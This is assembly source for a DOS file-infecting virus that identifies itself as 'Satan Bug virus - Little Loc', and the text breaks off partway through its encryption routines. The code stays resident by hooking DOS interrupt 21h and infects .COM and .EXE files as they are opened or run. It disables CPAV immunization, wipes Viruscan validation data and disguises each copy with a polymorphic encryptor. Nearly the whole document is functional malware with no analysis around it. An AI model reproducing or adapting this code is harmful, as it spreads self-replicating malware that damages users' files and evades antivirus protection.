CSEG SEGMENT
     ASSUME CS:CSEG, ES:CSEG, SS:CSEG
     ORG 100H
YES     EQU 1
NO      EQU 0
COM     EQU 0
EXE     EQU 1
Signal  EQU 0F9H
Reply   EQU 0AC0AH

;               


Start:  CALL $+3  
        POP AX
        MOV CL,4H
        SHR AX,CL
        SUB AX,0010H
        MOV CX,CS
        ADD AX,CX
        PUSH AX
        MOV AX,OFFSET Begin
        PUSH AX
        RETF
JJumpFile:JMP JumpFile
Begin:  PUSH DS
BeginC: POP WORD PTR CS:[FileDS]        ;Save DS
        PUSH CS
        POP DS
        CMP BYTE PTR DS:[File],COM      ;Are we in a .COM file?
        JNE NoBytes
        MOV AX,DS:[Bytes]               ;Restore first 3 Bytes of program
        MOV WORD PTR ES:[100H],AX
        MOV AX,DS:[Bytes+2H]
        MOV WORD PTR ES:[102H],AX
NoBytes:PUSH CS                         
        POP ES
        MOV AH,Signal                   
        INT 21H                         ;Check if we're already in memory
        CMP AX,Reply
        JE JJumpFile
        CMP BYTE PTR DS:[CommandCom],YES  ;Are we in Command.COM
        JE NoEnv
        MOV ES,DS:[FileDS]
        MOV ES,ES:[002CH]
        XOR DI,DI
        MOV SI,OFFSET Comspec
        MOV CX,OFFSET Comspec@-OFFSET Comspec
        CLD
        REPE CMPSB                        ;Look for COMSPEC=
        JNE JJumpFile
        XOR AX,AX
        MOV CX,0080
        CLD
        REPNE SCASB
        JNE JJumpFile
        MOV CX,000CH
        SUB DI,CX
        CLD
        REP CMPSB               ;COMSPEC must equil COMMAND.COM
        JNE JJumpFile
NoEnv:  PUSH CS
        POP ES
        MOV AX,DS:[FileDS]         ;Segment of our current MCB
        DEC AX
MCBLoop:MOV DS,AX
        CMP BYTE PTR DS:[0H],'Z'   ;Last MCB?
        JNE JJumpFile
MCBEnd: MOV AX,(OFFSET Done-OFFSET Start)*2  ;Reserve enough for encryption
        ADD AX,3072
        MOV CL,4H
        SHR AX,CL
        INC AX
        SUB WORD PTR DS:[0003H],AX           ;Subtract it from MCB.size
        XOR BX,BX
        MOV ES,BX
        SHR AX,CL
        SHR CL,1H
        SHR AX,CL
        INC AX
        SUB WORD PTR ES:[413H],AX            ;Subtract it from Interrupt 12H
        MOV AX,DS:[0003H]
        MOV BX,DS
        INC BX
        ADD AX,BX
        SUB AX,0010H
        MOV DI,100H
        MOV SI,DI
        MOV ES,AX
        PUSH CS
        POP DS
        MOV CX,OFFSET Vend-OFFSET Start
        CLD
        REP MOVSB                            ;Copy us to high memory
        PUSH ES
        MOV AX,OFFSET HighCode
        PUSH AX
        RETF                                 ;Jump to high memory
JumpFile:CMP BYTE PTR CS:[File],COM
        MOV ES,CS:[FileDS]                   ;Restore Segments
        MOV DS,CS:[FileDS]
        JNE JumpEXE
        MOV AX,100H
        PUSH DS
        PUSH AX
        XOR AX,AX
        XOR BX,BX
        RETF
JumpEXE:MOV AX,DS
        ADD AX,0010H
        PUSH AX
        ADD AX,CS:[EXECS]
        MOV WORD PTR CS:[JumpDat+3H],AX
        MOV AX,CS:[EXEIP]
        MOV WORD PTR CS:[JumpDat+1H],AX
        POP AX
        ADD AX,CS:[EXESS]
        CLI
        MOV SS,AX
        MOV SP,CS:[EXESP]
        XOR AX,AX
        XOR BX,BX
        STI
        JMP SHORT JumpDat
JumpDat:DB 0EAH,00H,00H,00H,00H

HighCode:PUSH CS
        POP DS
        MOV BYTE PTR DS:[Busy_Flag],No       ;initialize Flag
        MOV AX,3521H                         ;Hook interrupt 21
        INT 21H
        MOV WORD PTR DS:[Vector21],BX        ;Save Vector
        MOV WORD PTR DS:[Vector21+2H],ES
        PUSH CS
        POP ES
        MOV DI,OFFSET JumpHandle
        MOV DX,DI
        MOV AL,0EAH                          ;Make jump to our handle
        CLD
        STOSB
        MOV AX,OFFSET Handle21
        CLD
        STOSW
        MOV AX,CS
        CLD
        STOSW
        MOV AX,2521H                         ;Point Interrupt 21 to Jump
        INT 21H
        JMP JumpFile                         ;Return to program


IDText:         DB 'Satan Bug virus - Little Loc',0H


File            DB ?            ;Current File: .COM = 0, .EXE = 1
CommandCom      DB ?            ; = YES If in COMMAND.COM
Bytes           DD ?            ;Bytes replaced with jump in .COM files
Comspec         DB 'COMSPEC='
Comspec@:
Command         DB 'COMMAND.COM',0H
Command@:       
EXESP           DW ?              ;.EXE SP
EXESS           DW ?              ;.EXE SS Displacement
EXECS           DW ?              ;.EXE CS Displacement
EXEIP           DW ?              ;.EXE IP
RANDOM          DW ?              ;Random Number
LAST            DW ?              ;Random Number Data
Immune:         DB 22H,19H,35H,93H,59H,57H,54H,80H   ;CPAV's Immune I.D.
Validate:       DB 0F1H,0FEH,0C6H,0ABH,0H,0F1H       ;Scan's Validation I.D.
Validate@:
ImmuneJumpExe:  DB 0E9H,8CH,01H        ;Write to .EXE's immunized with CPAV
ImmuneJumpCom:  DB 0E9H,75H,01H        ;Write to .COM's immunized with CPAV

Handle21Pall:POP ES           ;POP REGS  (They were pushed in the decryption)
        POP DS
        POP BP
        POP SI
        POP DI
        POP DX
        POP CX
        POP BX
        POP AX
Handle21:CMP BYTE PTR CS:[Busy_Flag],Yes  ;If Flag set skip
        JNE Handle21SF
        JMP CS:Vector21
Handle21SF:MOV BYTE PTR CS:[Busy_Flag],Yes  ;Set Flag
        CMP AH,3DH          ;Open?
        JE Open
        CMP AH,4BH           ;Execute?
        JE Execute
        CMP AH,6CH           ;Extended open?
        JE ExtOpen
        CMP AH,Signal        ;Signal?
        JNE Jump21
        MOV AX,Reply         ;Tell other that we're already here
        MOV BYTE PTR CS:[ReturnFar],YES    ;Used later
        JMP JumpEM
Jump21: MOV BYTE PTR CS:[ReturnFar],NO     ;Used Later
        JMP JumpEM

Open:   MOV WORD PTR CS:[FileSeg],DX            
        MOV WORD PTR CS:[FileSeg+2H],DS    ;Save SEG:OFF of file
        JMP InfStart
Execute:CMP AL,03H
        JBE Open
        JMP Jump21
ExtOpen:MOV WORD PTR CS:[FileSeg],SI       ;Save SEG:OFF of file
        MOV WORD PTR CS:[FileSeg+2H],DS
InfStart:PUSH AX                           ;Save All Regs
        PUSH BX
        PUSH CX
        PUSH DX
        PUSH DI
        PUSH SI
        PUSH BP
        PUSH DS
        PUSH ES
        CALL Infect                        ;Infect the file
        MOV BYTE PTR DS:[ReturnFar],NO     ;Used Later 
        POP ES
        POP DS
        POP BP
        POP SI
        POP DI
        POP DX
        POP CX
        POP BX
        POP AX
JumpEM: MOV BYTE PTR CS:[Memory],YES       ;Tell encryption that we need
        JMP MemBuild                       ;to be encrypted in memory

Infect: CALL Which                         ;Determine if file is .EXE, .COM
        CMP AL,COM                         ; or other
        JNE MaybeEXE
        CALL InfCOM                        ;Infect .COM
        RETN
MaybeEXE:CMP AL,EXE
        JNE InfectRet
        CALL InfEXE                        ;Infect .EXE
InfectRet:RETN

JWhichRetNone:JMP WhichRetNone

Which:  PUSH CS                         
        POP DS
        MOV WORD PTR DS:[JumpHandle+1H],OFFSET Handle21  ;Point handle at us
        MOV BYTE PTR DS:[Opened],NO                      ; not decryption
        MOV BYTE PTR DS:[Attribute],NO
        MOV BYTE PTR DS:[Infected],NO
        MOV BYTE PTR DS:[CommandCom],NO
        MOV AX,2F00H                                     ;Get DTA SEG:OFF
        CALL Call21
        MOV WORD PTR DS:[DTA],BX
        MOV WORD PTR DS:[DTA+2H],ES                      ;Save it
        PUSH CS
        POP ES
        MOV DX,OFFSET NewDTA
        MOV AX,1A00H
        CALL Call21                                      ;Set to are DTA
        LDS DX,DS:[FileSeg]
        MOV AX,4E00H                                     ;Find the target file 
        MOV CX,0027H
        CALL Call21
        PUSHF
        MOV AX,1A00H                                     ;Reset DTA
        LDS DX,CS:[DTA]
        CALL Call21
        PUSH CS
        POP DS
        POPF
        JB JWhichRetNone
        CMP WORD PTR DS:[NewDTA+1CH],0H                  ;Must be larger then
        JNE WhichNoSize                                  ; 1024 Bytes
        CMP WORD PTR DS:[NewDTA+1AH],1024
        JB JWhichRetNone
WhichNoSize:CMP BYTE PTR DS:[NewDTA+19H],0C8H  ;19xx+100 Years 
        JNB JWhichRetNone
        ADD BYTE PTR DS:[NewDTA+19H],0C8H ;ADD 100 Years to date
        TEST BYTE PTR DS:[NewDTA+15H],01H ;Read Only?
        LDS DX,DS:[FileSeg]
        JE NoAttr
        XOR CX,CX                         ;if yes, set to 0
        MOV AX,4301H
        CALL Call21
        JB WhichRetNone
        MOV BYTE PTR CS:[Attribute],YES   ;Remember that we changed it
NoAttr: MOV AX,3D02H                       ;Open
        CALL Call21
        JB WhichRetNone
        PUSH CS
        POP DS
        MOV BYTE PTR DS:[Opened],YES       ;Remember that we opened it
        MOV BX,AX
        MOV AX,3F00H                       ;Read first 20H bytes
        MOV CX,0020H
        MOV DX,OFFSET First20
        CALL Call21
        JB WhichRetNone
        CMP AX,CX
        JNE WhichRetNone
        CMP WORD PTR DS:[First20],'ZM'     ;Is it an .EXE style program?
        JE WhichRetEXE
        MOV DI,OFFSET NewDTA+1EH               ;Offset of found file
        MOV CX,OFFSET Command@-OFFSET Command
        MOV SI,OFFSET Command
        PUSH DI
        PUSH SI
        CLD
        REP CMPSB                           ;Is it COMMAND.COM?
        POP SI
        POP DI
        JE RetCommand
        MOV CX,14
        XOR AX,AX
        CLD
        REPNE SCASB                        ;Find end of file
        JNE WhichRetNone
        MOV CX,5H                          ;Comp last 5 Bytes
        SUB DI,CX
        ADD SI,0007H
        CLD
        REP CMPSB                          ;Is it an .COM style program?
        JE WhichRetCOM
WhichRetNone:
        CALL Close
        XOR AX,AX
        DEC AX
        RETN
RetCommand:MOV BYTE PTR DS:[CommandCom],YES   ;Remember that this file is
WhichRetCOM:                                  ;  Command.COM
        MOV AL,COM
        MOV BYTE PTR DS:[File],AL
        RETN
WhichRetEXE:    
        MOV AL,EXE
        MOV BYTE PTR DS:[File],AL
        RETN

PositionEnd:
        MOV AX,4202H            ;Set File Pointer to end
        XOR CX,CX
        MOV DX,CX
        CALL Call21
        CMP BYTE PTR DS:[File],COM
        JE NoDivide
        PUSH AX                  ;If .EXE then get Page size and modula data
        PUSH DX
        PUSH CX
        MOV CX,200H
        DIV CX
        INC AX
        CMP WORD PTR DS:[First20+4H],AX     ;Must be right in header or abort
        JNE HeaderError
        CMP WORD PTR DS:[First20+2H],DX
        JNE HeaderError
        POP CX
        POP DX
        POP AX
NoDivide:CALL FindScan                      ;Delete validation data (Viruscan)
        JB PosEndErr
        MOV CX,DX
        MOV DX,AX
        MOV AX,4200H                        ;Set file pointer to beginning
        CALL Call21
        TEST AX,000FH
        JE NoAdjust
        AND AX,0FFF0H                       ;Set to Paragraph
        ADD AX,0010H
        MOV CX,DX
        MOV DX,AX
        MOV AX,4200H
        CALL Call21                          ;at end
NoAdjust:CMP BYTE PTR DS:[File],COM         ;Is it a .COM file
        JNE NoSize
        OR DX,DX
        JNE PosEndErr
        CMP AX,65535-(OFFSET Done-OFFSET Start)-2048  ;.COM's must be < 
        JA PosEndErr
NoSize: MOV WORD PTR DS:[OldFileSize],AX      ;Save original size (for CPAV)  
        MOV WORD PTR DS:[OldFileSize+2H],DX
        MOV BYTE PTR DS:[Memory],NO           ;Tell encryption it's for a
                                              ; file
        CALL Build                      ;Make encrypted copy of us
        MOV AX,4000H                    ;Write it to the file
        CALL Call21
        JB PosEndErr
        MOV BYTE PTR DS:[Infected],YES     ;Remember that this file is Infected
        MOV AX,4201H                      ;4201 DX=CX=0: Get current File Pointer
        XOR CX,CX
        MOV DX,CX
        CALL Call21
        MOV WORD PTR DS:[NewFileSize],AX      ;Remember new file size
        MOV WORD PTR DS:[NewFIleSize+2H],DX   ; (for .EXE header)
        XOR AX,AX
        RETN
HeaderError:POP CX
        POP DX
        POP AX
PosEndErr:XOR AX,AX
        DEC AX
        RETN
PositionStart:
        MOV AX,4200H                    ;AX=4200 CX=DX=0 set pointer to start
        XOR CX,CX
        XOR DX,DX
        CALL Call21
        MOV DX,OFFSET First20
        MOV CX,20H                      ;Read 20H Bytes
        MOV AX,4000H
        CALL Call21
        JB PosStaErr
        XOR AX,AX
        RETN
PosStaErr:XOR AX,AX
        DEC AX
        RETN

FindScan:PUSH AX
        PUSH DX
        SUB AX,75                       ;Validation bytes are in lat 75 Bytes
        MOV CX,DX                       ; of the program (if they're there)
        MOV DX,AX
        MOV AX,4200H
        CALL Call21                     ;Set file position
        MOV DX,OFFSET Encrypt
        MOV CX,75
        MOV AX,3F00H                    ;Read those last 75 Bytes
        CALL Call21
        CMP AX,CX
        JNE ScanErr
        CALL ScanSearch                 ;Are validation bytes here?
        OR AX,AX
        JNE FindRet
        POP DX
        POP AX
        SUB AX,75
        ADD AX,DI
        MOV CX,DX
        MOV DX,AX
        MOV AX,4200H                   ;Set file position to Validation bytes
        CALL Call21
        PUSH AX
        PUSH DX    
        MOV AX,4000H                   ;Overwrite them with Zero
        MOV CX,75
        SUB CX,DI
        MOV DI,OFFSET Decrypt
        MOV DX,DI
        PUSH AX
        PUSH CX
        XOR AX,AX
        CLD
        REP STOSB
        POP CX
        POP AX
        CALL Call21
        JB ScanErr
FindRet:CLC
        POP DX
        POP AX
        RETN
ScanErr:STC
        POP DX
        POP AX
        RETN



ScanSearch:MOV AL,0FFH                 
        CALL ScanDecrypt               ;Decrypt Internal Validation bytes
        MOV SI,OFFSET Validate
        MOV DI,OFFSET Encrypt
        MOV CX,76-(OFFSET Validate@-OFFSET Validate)
        CLD
        LODSB
SearchCont:REPNE SCASB                  ;Find first byte
        JNE SearchNeg
        PUSH SI
        PUSH CX
        CLD
        REP CMPSB                       ;if found then compare rest
        POP CX
        POP SI
        JE SearchYes
        JMP SearchCont
SearchNeg:MOV AL,1H                    ;Encrypt Internal Validation Bytes
        CALL ScanDecrypt
        XOR AX,AX
        DEC AX
        RETN

SearchYes:SUB DI,OFFSET Encrypt 
        SUB DI,CX
        DEC DI                         ;Get offset from encrypt 
        MOV AL,1H                                            
        CALL ScanDecrypt               ;Encrypt Internal Validation Bytes
        XOR AX,AX
        RETN

ScanDecrypt:MOV SI,OFFSET Validate
        MOV CX,OFFSET Validate@-OFFSET Validate
ScanLP: ADD BYTE PTR DS:[SI],AL
        INC SI
        LOOP ScanLP
        RETN

Close:  CMP BYTE PTR DS:[Opened],NO       ;Was it opended?
        JE NoClose
        CMP BYTE PTR DS:[Infected],YES    ;Was it infected
        JNE NoDate
        MOV AX,5701H                      ;then reset date
        MOV CX,DS:[NewDTA+16H]
        MOV DX,DS:[NewDTA+18H]
        CALL Call21
NoDate: MOV AX,3E00H                      ;then close
        CALL Call21
NoClose:CMP BYTE PTR DS:[Attribute],NO    ;Was the attribute changed?
        JE NoSetAttr
        XOR CX,CX
        MOV CL,DS:[NewDTA+15H]
        TEST CL,1H
        JE NoSetAttr
        MOV AX,4301H                      ;then reset it
        LDS DX,DS:[FileSeg]
        CALL Call21
        PUSH CS
        POP DS
NoSetAttr:RETN
      



DisImmune:CMP BYTE PTR DS:[File],EXE    ;Is file .EXE
        JE ExeImmune
        MOV SI,OFFSET First20
        MOV DI,OFFSET ImmuneBytes
        MOV CX,000EH
        CLD
        REP MOVSB                       ;Move header info
        JMP ImmuneComp
ExeImmune:MOV DX,DS:[First20+8H]        ;Size of header
        MOV CL,4H                       ;Change form paragraphs to bytes
        SHL DX,CL
        MOV AX,4200H                    ;set to that position
        XOR CX,CX
        CALL Call21
        MOV AX,3F00H                    ;Read those 10H bytes
        MOV DX,OFFSET ImmuneBytes
        MOV CX,0010H
        CALL Call21
        CMP AX,CX
        JNE DisImmuneNo
ImmuneComp:MOV DI,OFFSET ImmuneBytes+6H
        MOV SI,OFFSET Immune
        MOV CX,0008H                       ;Is CPAV Immune here?
        CLD 
        REP CMPSB
        JNE DisImmuneYes
        CMP BYTE PTR DS:[File],EXE         ;Is file an .EXE
        JNE ImmunePosCom
        JMP ImmunePosExe
DisImmuneNo:XOR AX,AX
        DEC AX
        RETN
DisImmuneYes:XOR AX,AX
        RETN
ImmunePosCom:XOR CX,CX
        MOV DX,DS:[ImmuneBytes+1H]         ;Offset to End of immunization code
        SUB DX,02F0H                       ;Set Offset Start of immunzation code
        MOV AX,4200H                            
        CALL Call21
        JMP ImmuneWrite
ImmunePosExe:XOR AX,AX
        MOV DX,DS:[First20+8H]             ;End of header
        ADD DX,DS:[First20+16H]            ;plus .EXE start offset
        CMP DX,0FFFH
        JB ImmuneNoR
        PUSH DX
        AND DX,0F000H
        MOV AX,DX
        POP DX
        MOV CL,4H
        ROL AX,CL
ImmuneNoR:MOV CL,4H
        SHL DX,CL
        ADD DX,DS:[First20+14H]
        JNB ImmuneNoI
        INC AX
ImmuneNoI:ADD DX,0030H
        JNB ImmuneNoI1
        INC AX
ImmuneNoI1:MOV CX,AX
        MOV AX,4200H
        CALL Call21
ImmuneWrite:MOV AX,4000H                   ;Write jump to code
        MOV CX,0003H
        MOV DX,OFFSET ImmuneJumpCom
        CMP BYTE PTR DS:[File],COM
        JE ImmuneW
        MOV DX,OFFSET ImmuneJumpExe
ImmuneW:CALL Call21
        JB DisImmuneNo
        XOR AX,AX
        RETN

InfCOM: CALL DisImmune
        OR AX,AX
        JNE InfCOMClose
        MOV AX,DS:[First20]                ;Save bytes from CPAV code
        MOV WORD PTR DS:[Bytes],AX
        MOV AX,DS:[First20+2H]
        MOV WORD PTR DS:[Bytes+2H],AX
        CALL PositionEnd                   ;To end of file
        OR AX,AX
        JNE InfCOMClose
        MOV DI,OFFSET First20
        MOV AL,0E9H                        ; 0E9H = JMP xxxx
        CLD
        STOSB
        MOV AX,DS:[OldFileSize]
        SUB AX,0003H                       ;End of file
        CLD
        STOSW
        CALL PositionStart                 ;To start
InfCOMClose:CALL Close
        RETN

InfEXE: CALL DisImmune                     ;Call the anti-CPAV code
        OR AX,AX
        JNE InfEXEClose
        CMP WORD PTR DS:[First20+0CH],-1   ;.EXE must ask for all of memory
        JNE InfEXEClose
        MOV AX,DS:[First20+0EH]            ;Get stack seg displacement
        MOV WORD PTR DS:[EXESS],AX         ;Save it
        MOV AX,DS:[First20+10H]            ;Get Stack Pointer
        MOV WORD PTR DS:[EXESP],AX         ;Save it
        MOV AX,DS:[First20+14H]            ;Get Instruction pointer
        MOV WORD PTR DS:[EXEIP],AX         ;Save it
        MOV AX,DS:[First20+16H]            ;Get Code segment displacement
        MOV WORD PTR DS:[EXECS],AX         ;Save it
        CALL PositionEnd                   ;To end
        OR AX,AX
        JNE InfEXEClose
        CALL FixHeader                     ;Fix .EXE Header
        CALL PositionStart                 ;To start
InfEXEClose:CALL Close
        RETN

FixHeader:MOV AX,DS:[NewFileSize]
        MOV DX,DS:[NewFileSize+2H]
        MOV CX,200H
        DIV CX
        INC AX
        MOV WORD PTR DS:[First20+2H],DX ;Set size in Header to accomendate us
        MOV WORD PTR DS:[First20+4H],AX
        MOV AX,DS:[OldFileSize]
        MOV DX,DS:[First20+8H]
        MOV CL,4H
        SHL DX,CL
        SUB AX,DX                    ;Set IP to us
        MOV WORD PTR DS:[AddSeg],0H
IP_CMP: CMP AX,65535-((OFFSET Done-OFFSET Start)+4096)
        JB NoIPMan
        SUB AX,0010H
        INC WORD PTR DS:[AddSeg]
        JMP SHORT IP_CMP
NoIPMan:MOV WORD PTR DS:[First20+14H],AX
        MOV AX,DS:[OldFileSize+2H]
        CMP AX,000FH
        JA FixError
        XCHG AL,AH
        SHL AX,CL
        ADD AX,DS:[AddSeg]
        MOV WORD PTR DS:[First20+16H],AX
        MOV WORD PTR DS:[First20+0EH],AX
        MOV WORD PTR DS:[First20+10H],0FFFEH
        XOR AX,AX
        RETN
FixError:XOR AX,AX
        DEC AX
        RETN

Call21: PUSHF
        CALL CS:Vector21
        RETN

RND:    PUSH CX
RND1:   PUSH AX
        XOR AX,AX
        MOV DS,AX
        POP AX
        ADD AX,DS:[46CH]
        PUSH CS
        POP DS
        ADD AX,DS:[RANDOM]
        ADD CX,AX
        XCHG AL,AH
        TEST AX,CX
        JE RND2
        TEST CH,CL
        JE RND3
        ADD CX,AX
RND2:   XCHG CL,CH
        SUB CX,AX
        SUB WORD PTR DS:[RANDOM],AX
        CMP WORD PTR DS:[LAST],AX
        JNE RNDRT
        TEST CX,AX
        JNE RND3
        SUB AH,CL
        ADD CX,AX
        TEST AL,CL
        JNE RND3
        TEST WORD PTR DS:[RANDOM],AX
        JE RND3
        SUB CX,AX
RND3:   XCHG AL,AH
        SUB CX,AX
        XCHG CL,CH
        JMP RND1
RNDRT:  MOV WORD PTR DS:[LAST],AX
        POP CX
        RET
RND@:

MemBuild:PUSH AX
        PUSH BX
        PUSH CX
        PUSH DX
        PUSH DI
        PUSH SI
        PUSH BP
        PUSH DS
        PUSH ES
        PUSH CS
        POP ES
        PUSH CS
        POP DS
BUILD:  PUSH BX
        CALL ALTTAB
        MOV DI,OFFSET DECRYPT
        AND DI,0FFF0H
        ADD DI,0010H
        MOV WORD PTR DS:[DOFF],DI
        MOV WORD PTR DS:[EOFF],OFFSET ENCRYPT
        CMP BYTE PTR DS:[Memory],YES
        JE CallMH
        CALL HEAD
        JMP SHORT BUILDL
CallMH: CALL MemHead
BUILDL: CALL RND
        AND AX,001FH
        JE BUILDL
        MOV WORD PTR DS:[ECNT],AX
        MOV WORD PTR DS:[INST],AX
BUILDLP:CALL MAKE
        DEC WORD PTR DS:[ECNT]
        JNE BUILDLP
        CMP BYTE PTR DS:[Memory],YES
        JE CallMT
        CALL BTAIL
        JMP SHORT BuildRet
CallMT: POP AX
        JMP MemTail
BuildRet:POP BX
        RETN
BUILD@:

MAKE:   MOV BX,OFFSET ETAB
        CALL RND
        AND AX,001FH
        SHL AX,1H
        ADD BX,AX
        MOV SI,DS:[BX]
        ADD SI,OFFSET ETAB
        INC SI
        MOV DI,DS:[EOFF]  ;DI=OFFSET OF ENCRYPT+N
        MOV AH,DS:[SI-1H]
        MOV CL,4H
        SHR AH,CL           ;GET INSTRUCTION SIZE
        XOR CX,CX
        MOV CL,AH
        CALL RND
        TEST AX,1H
        JNE NOSWI
        PUSH CX
        PUSH DI
        PUSH SI
        MOV DI,SI
        ADD DI,CX
SWLP:   MOV AL,DS:[DI]
        XCHG DS:[SI],AL
        CLD
        STOSB
        INC SI
        LOOP SWLP
        POP SI
        POP DI
        POP CX
NOSWI:  MOV DL,DS:[SI-1H]
        TEST DL,00001000B
        JE MOVINT
        MOV BX,OFFSET LODSTO
        MOV AL,DS:[BX]
        CLD
        STOSB
        JMP PUTADD
MOVINT: CALL RND
        TEST AL,1H
        JNE PUTADD
        PUSH SI
        ADD SI,CX
        DEC SI
        TEST DL,00000100B
        JNE ROTCL
        DEC SI
        TEST DL,00000010B
        JNE ROTCL
        DEC SI
ROTCL:  TEST DL,1H
        JE ROTIT
        DEC SI
ROTIT:  RCR BYTE PTR DS:[SI],1H
        CMC
        RCL BYTE PTR DS:[SI],1H
        ADD SI,CX
        RCR BYTE PTR DS:[SI],1H
        CMC
        RCL BYTE PTR DS:[SI],1H
        POP SI
PUTADD: TEST DL,00000100B
        JNE NOADD
        PUSH SI
        ADD SI,CX
        DEC SI
        TEST DL,00000010B
        JNE ADBYTE
        CALL RND
        DEC SI
        ADD WORD PTR DS:[SI],AX
        ADD SI,CX
        ADD WORD PTR DS:[SI],AX
        POP SI
        JMP NOADD
ADBYTE: CALL RND
        ADD BYTE PTR DS:[SI],AL
        ADD SI,CX
        ADD BYTE PTR DS:[SI],AL
        POP SI
NOADD:  PUSH CX
        CLD
        REP MOVSB
        POP CX
        TEST DL,00001000B
        JNE PUTSTO
        CALL PUTINC
        JMP MDEC
PUTSTO: MOV AL,DS:[BX+1H]
        CLD
        STOSB
MDEC:   MOV WORD PTR DS:[EOFF],DI
        MOV DI,DS:[DOFF]
        MOV BYTE PTR DS:[FillB],YES
        TEST DL,00001000B
        JE DECMOV
        MOV AL,DS:[BX]
        CLD
        STOSB
        CALL Fill
DECMOV: CLD
        REP MOVSB
        CALL Fill
        TEST DL,00001000B
        JE DECINC
        MOV AL,DS:[BX+1H]
        CLD
        STOSB
        JMP DECRT
DECINC: CALL PUTINC
DECRT:  CALL Fill
        CMP WORD PTR DS:[ECNT],1H
        JNE SAVEDI
        CMP BYTE PTR DS:[Memory],YES
        JNE NoDecJMP
        CALL Fill
        JMP SHORT SaveDI
NoDecJMP:MOV AL,0EBH
        CLD
        STOSB
        XOR AX,AX
        MOV BX,DI
        CLD
        STOSB
        MOV AX,DS:[INST]
        SHL AX,1H
        CMP AX,6H
        JBE SaveDI
        SUB AX,0006H                                                        
        MOV CX,AX
        CALL Fill_NUM
Make_LP:CALL RND
        TEST AL,1H
        JNE MAKE_NI
        INC BYTE PTR DS:[BX]
Make_NI:LOOP Make_LP
SaveDI: MOV WORD PTR DS:[DOFF],DI
        MOV BYTE PTR DS:[FillB],NO
        RETN
MAKE@:  

Fill_NUM:PUSH AX
        PUSH BX
        PUSH CX
        MOV BX,OFFSET FTABLE
FINLP:  CALL RND
        AND AX,000FH
        XLAT
        CLD
        STOSB
        LOOP FINLP
        POP CX
        POP BX
        POP AX
        RETN
Fill_NUM@:

Fill:   PUSH AX
        PUSH BX
        PUSH CX
        CALL RND
        AND AX,001FH
        MOV CX,AX
        JCXZ FILRT
        MOV BX,OFFSET FTABLE
FILP:   CALL RND
        MOV AH,0FH
        CMP BYTE PTR DS:[Memory],YES
        JNE AndEf
        MOV AH,07H
AndEf:  AND AL,AH
        XLAT
        CLD
        STOSB
        LOOP FILP
FILRT:  POP CX
        POP BX
        POP AX
        RETN
Fill@:

FTABLE: NOP
        STC
        CLC
        CMC
        CLD
        STI
        NOP     ;SAHF
        DB 2EH
        DB 3EH
        DB 26H
        INC BX
        DEC BX
        INC DX
        DEC DX
        INC BP
        DEC BP
FTABLE@:

PUTINC: PUSH AX
        PUSH CX
        PUSH SI
        MOV CL,DS:[FillB]
        MOV SI,OFFSET INCDOFF
        CALL RND
        TEST AL,01H
        JE MOVINC
        ADD SI,6H
MOVINC: CLD
        MOVSB
        JCXZ NOFIL1
        CALL Fill7
NOFIL1: CLD
        MOVSB
        JCXZ NOFIL2
        CALL Fill7
NOFIL2: CALL RND
        TEST AL,1H
        JE MOVINC1
        INC SI
        INC SI
        CLD
        MOVSW
        JMP SHORT MOVINCR
MOVINC1:CLD
        MOVSB
        JCXZ NOFIL3
        CALL Fill7
NOFIL3: CLD
        MOVSB
MOVINCR:POP SI
        POP CX
        POP AX
        RETN
PUTINC@:

Fill7:  PUSH AX
        PUSH CX
        CALL RND
        AND AX,0007H
        MOV CX,AX
        JCXZ NOFL7
        CALL Fill_NUM
NOFL7:  POP CX
        POP AX
        RETN
Fill7@:

BTAIL:  MOV SI,OFFSET TOP
        CALL RND
        MOV CX,6H
        TEST AL,1H
        JE TAILMOV
        ADD SI,CX
TAILMOV:CLD 
        REP MOVSB
        MOV AX,DI
        SUB AX,DS:[DEC_START]          ;TELL TAIL WHERE TO JMP
        NEG AX
        MOV WORD PTR DS:[DI-2H],AX
        MOV WORD PTR DS:[DOFF],DI
        MOV BX,DS:[INST]
        SHL BX,1H
        MOV AX,DI
        SUB AX,BX                     ;HOW MUCH OF THE DECRYPTION 
        PUSH AX                       ;  TO ENCRYPT?
        PUSH BX
        MOV BX,OFFSET FTABLE
        XOR DX,DX
TAILSL: TEST DI,000FH
        JE TAILPA
        CALL RND
        AND AX,000FH
        XLAT
        STOSB
        INC DX
        JMP TAILSL
TAILPA: POP BX
        MOV SI,OFFSET Start
        MOV CX,OFFSET Done-OFFSET Start
        CLD
        REP MOVSB
        CALL RND
        AND AX,1H
        ADD DI,AX
        MOV AX,OFFSET DECRYPT
        AND AX,0FFF0H
        ADD AX,0010H
        SUB DI,AX
        MOV WORD PTR DS:[SIZ],DI
        MOV DI,DS:[EOFF]
        MOV BYTE PTR DS:[DI],0C3H
        MOV AX,OFFSET Done-OFFSET Start
        ADD AX,BX
        ADD AX,DX
        XOR DX,DX
        DIV WORD PTR DS:[INST]
        SHR AX,1H
        MOV CX,AX
        INC CX
        MOV DI,DS:[MOVCX]
        MOV WORD PTR DS:[DI],CX
        POP DI
        PUSH DI
        MOV BX,DS:[CALL_OFF]
        SUB DI,BX
        MOV SI,DS:[ADDSI]
        MOV WORD PTR DS:[SI],DI
        POP DI
        MOV SI,DI
TAILE:  MOV AX,OFFSET ENCRYPT
        CALL AX
        LOOP TAILE
        MOV DX,OFFSET DECRYPT
        AND DX,0FFF0H
        ADD DX,0010H
        MOV CX,DS:[SIZ]
        RETN
BTAIL@:

INCDOFF:INC DI
        INC DI
        PUSH DI
        POP SI
        MOV SI,DI

        INC SI
        INC SI
        PUSH SI
        POP DI
        MOV DI,SI
INCDOFF@:



TOP:    DEC CX
        JE TOP1
        JMP Start
TOP1:   DEC CX
        JCXZ TOP@
        JMP Start
TOP@:

HEAD:   MOV BYTE PTR DS:[PUTCLD],NO
        MOV BYTE PTR DS:[PUTCX],NO
        MOV BYTE PTR DS:[FORCE],NO
        MOV BYTE PTR DS:[PUSHED],NO
        MOV BX,OFFSET HOP
        MOV SI,BX
        CALL CALL_EM
        CLD
        MOVSB
        PUSH DI
        XOR AX,AX
        CLD
        STOSW
        MOV WORD PTR DS:[CALL_OFF],DI
        CALL RND
        AND AX,001FH
        MOV CX,AX
        JCXZ HEAD_NCL
        CALL Fill_NUM
HEAD_NCL:CALL PUTCL
        POP AX
        PUSH BX
        MOV BX,AX
        JCXZ HEAD_ZER
HEAD_LP:CALL RND
        TEST AL,1H
        JNE HEAD_NI
        INC BYTE PTR DS:[BX]
HEAD_NI:LOOP HEAD_LP
HEAD_ZER:POP BX
        INC SI
        INC SI
        CALL RND
        AND AX,0001H
        MOV DX,AX
        CLD
        LODSB
        OR AL,DL
        CLD
        STOSB
        CALL CALL_EM
